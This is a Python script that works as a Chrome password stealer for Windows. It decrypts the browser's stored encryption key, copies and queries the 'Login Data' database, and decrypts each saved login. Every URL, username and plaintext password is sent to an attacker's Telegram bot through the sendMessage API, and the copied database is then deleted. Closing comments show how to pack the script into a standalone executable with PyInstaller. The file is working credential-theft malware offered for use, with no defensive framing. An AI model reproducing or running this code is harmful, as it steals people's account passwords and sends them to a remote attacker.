import os
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import json
import base64
import shutil
import requests

def get_win_key():
    username = os.getlogin()
    local_computer_directory_path = os.path.join(
        "C:\\Users", username,
        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
    
    encryption_key = encryption_key[5:]
    
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def decode(password, encryption_key):

    try:
        iv = password[3:15]
        password = password[15:]
        
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"

def main(): 
    API_KEY = "API_KEY"
    CHAT_ID = ""
    username = os.getlogin()

    key = get_win_key() 
    db_path = os.path.join(
        "C:\\Users", username,
        "AppData", "Local", "Google", "Chrome", "User Data","Default","Login Data"
    )
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename) 
      
    db = sqlite3.connect(filename) 
    cursor = db.cursor() 
      
    cursor.execute( 
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used") 
    c = 0
    for row in cursor.fetchall(): 
        c+=1
        main_url = row[0] 
        login_page_url = row[1] 
        user_name = row[2] 
        decrypted_password = decode(row[3], key) 
        date_of_creation = row[4] 
        last_usuage = row[5] 
          
        if user_name or decrypted_password: 
            txt=f"""{main_url}
{login_page_url}
{user_name}
{decrypted_password}\n"""
            result = requests.get(f"https://api.telegram.org/bot{API_KEY}/sendMessage?chat_id={CHAT_ID}&text={txt}").json()
            print(c)
            
          
        else: 
            continue
          
    cursor.close() 
    db.close() 
      
    try: 
         
        os.remove(filename) 
    except: 
        pass
if __name__ == "__main__": 
    main()



# pip install pyinstaller
# pyinstaller --onefile .\main.py
